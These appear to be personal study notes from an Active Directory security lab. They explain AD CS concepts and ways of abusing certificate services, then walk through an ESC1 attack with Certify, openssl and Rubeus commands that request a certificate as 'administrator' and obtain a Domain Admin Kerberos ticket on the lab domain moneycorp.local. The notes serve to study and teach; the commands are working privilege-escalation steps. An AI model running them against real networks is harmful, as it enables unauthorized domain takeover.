### AD CS (Active Directory Certificate Services)
- Active Directory Certificate Services (AD CS) enables use of Public Key Infrastructure (PKI) in active directory forest.
- AD CS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more.
- "AD CS is the Server Role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization."
- __CA__ - The certification authority that issues certificates. The server with AD CS role (DC or separate) is the CA.
- __Certificate__ - Issued to a user or machine and can be used for authentication, encryption, signing etc.
- __CSR__ - Certificate Signing Request made by a client to the CA to request a certificate.
- __Certificate Template__ - Defines settings for a certificate. Contains information like - enrolment permissions, EKUs, expiry etc.
- __EKU OIDs__ - Extended Key Usages Object Identifiers. These dictate the use of a certificate template (Client authentication, Smart Card Logon, SubCA etc.

![[Pasted image 20240128131239.png]]

__There are various ways of abusing ADCS:__
– Extract user and machine certificates
– Use certificates to retrieve NTLM hash
– User and machine level persistence
– Escalation to Domain Admin and Enterprise Admin
– Domain persistence

![[Pasted image 20240128132007.png]]
![[Pasted image 20240128132033.png]]
#### AD CS Enumeration
##### Requirements for ESC1, ESC3, ESC6
– CA grants normal/low-privileged users enrollment rights
– Manager approval is disabled
– Authorization signatures are not required
– The target template grants normal/low-privileged users enrollment rights


__Enumerate CA__
```powershell
Certify.exe cas
```
__Enumerate templates__
```powershell
Certify.exe find
```

__Enumerate vulnerable templates__
```powershell
Certify.exe find /vulnerable
```

#### ESC1
- The template "HTTPSCertificates" has ENROLLEE_SUPPLIES_SUBJECT value for msPKI-Certificates-Name-Flag
```powershell
Certify.exe /enrolleeSuppliesSubject
```
- The template "HTTPSCertificates" allows enrollment to the RDPUsers group. Request a certificate for DA (or EA).
```powershell
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
```
- Convert from cert.pem to pfx (esc1.pfx below)
```powershell
openssl.exe pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
- Request a TGT for DA (or EA).
```powershell
Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt
```





